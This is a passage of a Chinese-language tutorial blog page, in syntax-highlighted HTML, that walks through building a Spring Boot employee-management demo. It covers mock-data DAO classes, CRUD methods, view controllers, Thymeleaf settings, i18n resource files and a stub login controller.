#61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;教学部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">102</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">102</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;市场部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">103</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">103</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;校验部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">104</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">104</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;运营部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">105</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">105</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;后勤部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">   }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #7F848E; font-style: italic">//获得所有部门信息</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Collection</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Department</span><span style="color: #ABB2BF">&gt;</span><span style="color: #61AFEF"> getDepartments</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">values</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过id得到部门</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Department</span><span style="color: #61AFEF"> getDepartment</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">id</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.dao</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.example.demo.pojo.Department</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.example.demo.pojo.Employee</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.stereotype.Repository</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Collection</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Repository</span><span style="color: #7F848E; font-style: italic">//使用spring托管</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">EmployeeDao</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//模拟数据</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75">  </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Employee</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> employees </span><span style="color: #56B6C2">=</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//员工有所属部门，所以需要继承部门</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DepartmentDao</span><span style="color: #E06C75"> departmentDao</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">        employees </span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Employee</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//创建一个员工表</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;教学部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">102</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">102</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;市场部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">103</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">103</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;校验部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">104</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">104</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;运营部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">105</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Department</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">105</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;后勤部&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//获得所有部门信息</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Collection</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Department</span><span style="color: #ABB2BF">&gt;</span><span style="color: #61AFEF"> getDepartments</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">values</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过id得到部门</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Department</span><span style="color: #61AFEF"> getDepartment</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">id</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><code>@Repository</code>标记该类为 Spring 管理的 “数据访问组件”，Spring 会自动扫描并将其实例化存入 IoC 容器，后续可通过 <code>@Autowired</code> 注入使用</p></li><li><p>在部员层写增删改查</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//主键自增</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> initId </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">1006</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//从1006开始自增</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//增加员工</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">save</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Employee</span><span style="color: #E06C75"> employee){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">employee</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">()</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">null</span><span style="color: #E06C75">){</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">employee</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setId</span><span style="color: #ABB2BF">(initId++);</span><span style="color: #7F848E; font-style: italic">//序号++</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employee</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDepartment</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">departmentDao</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDepartment</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">employee</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDepartment</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">()));</span><span style="color: #7F848E; font-style: italic">//给部员绑定完整的部门信息</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//建立一个部门从departmentDao得到id，而id是从employee的部门编号获得的</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">employee</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">(),employee);</span><span style="color: #7F848E; font-style: italic">//将数据放进去</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//查询员工信息</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Collection</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">Employee</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getAll</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">values</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p><code>Collection</code> 是 Java 集合框架的顶层接口，<code>List</code>、<code>Set</code> 等都实现了它</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;Employee&gt;需要的是所有员工对象，不需要id，所以没写</span></span></code></pre></div></div></figure><p>返回 <code>Collection&lt;Employee&gt;</code>（接口）而不是具体实现类（比如 <code>ArrayList&lt;Employee&gt;</code>）后续如果需要修改存储结构（比如把 <code>Map</code> 换成 <code>List</code> 存储员工）<code>getAll()</code> 方法的返回类型不用变，调用方的代码也不用改（面向接口编程）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//通过id查询员工</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Employee</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getEmployeeById</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//通过id删除员工</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">delete</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">employees</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li></ul><h2 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h2><ul><li><p>在自定义mvc中加入视图模板，同于直接访问跳转index.html</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Configuration</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MyMvcConfig</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebMvcConfigurer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> addViewControllers</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ViewControllerRegistry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">registry</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// 注册视图控制器：将请求路径映射到视图名</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">registry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addViewController</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">setViewName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;index&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//访问xxxx就跳转到---index</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">registry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addViewController</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/index.html&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">setViewName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;index&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>使用thymeleaf，修改index.html为模板可支持的代码</p><p>可以看上面的解释</p><p>还要关闭模板引擎的缓存（在配置文件里面）</p><figure class="shiki properties"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">spring.thymeleaf.cache</span><span style="color: #98C379"> </span><span style="color: #ABB2BF">=</span><span style="color: #98C379"> false</span><span style="color: #7F848E; font-style: italic">;</span></span></code></pre></div></div></figure></li></ul><h2 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h2><p>页面的中英文转化</p><h3 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h3><ul><li><p>必须在UTF-8下</p></li><li><p>新建目录<code>i18n</code>就是国际化单词缩写ixxxn（xxx有18个）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251101220950721.png" alt="image-20251101220943620"></p></li><li><p>在里面写两个空文件<code>login.properties</code>  <code>login_zh_CN.properties</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251101221302252.png" alt="image-20251101221302197"></p></li><li><p>直接右键new即可添加文件</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251101221944664.png" alt="image-20251101221944575"></p></li><li><p>可以使用进行<code>Resource Bundle</code>可视化配置(新版idea需要下载插件)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251101222304532.jpg" alt="551415459f4d16a5ce8c128bebfec603"></p><p>根据首页内容进行配置即可</p></li></ul><h3 id="国际化识别"><a href="#国际化识别" class="headerlink" title="国际化识别"></a>国际化识别</h3><p>通过MessageSourceAutoConfiguration类</p><ul><li><p>在配置文件配置</p><figure class="shiki properties"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">spring.messages.basename</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">i18n.login</span></span></code></pre></div></div></figure></li><li><p>国际化表达形式（在模板中）</p><p>#{}</p></li></ul><h3 id="国际化消息转换"><a href="#国际化消息转换" class="headerlink" title="国际化消息转换"></a>国际化消息转换</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251101223508332.png" alt="image-20251101223508202"></p><h2 id="登录实现"><a href="#登录实现" class="headerlink" title="登录实现"></a>登录实现</h2><ul><li><p><img src="/../../AppData/Roaming/Typora/typora-user-images/image-20251102201604377.png" alt="image-20251102201604377"></p><p>在index.html中修改，登录之后的跳转地址（点击提交按钮，直接跳转请求）</p></li><li><p>跳转在controller里面写</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.controller</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.stereotype.Controller</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.RequestMapping</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.ResponseBody</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Controller</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LoginController</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;user/login&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ResponseBody</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> login</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ok&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//测试登录之后能不能到这个请求</span></span></code></pre></div></div></figure><p>注释解释：</p><ul><li><code>@Controller</code>：标识该类为 Spring MVC 的控制器，用于处理 HTTP 请求。</li><li><code>@RequestMapping(&quot;user/login&quot;)</code>：映射 HTTP 请求路径，当客户端访问<code>/user/login</code>路径时，会触发<code>login()</code>方法。</li><li><code>@ResponseBody</code>：表示该方法的返回值会直接作为 HTTP 响应体返回（而非视图名称），这里会返回字符串 “ok”。</li></ul></li><li><p>接受usename    password</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">login</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;password&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> password){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ok&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>回显数据</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">login</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;password&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> password</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Model</span><span style="color: #E06C75"> model){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ok&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>具体业务</p><figure class="shiki java"><div 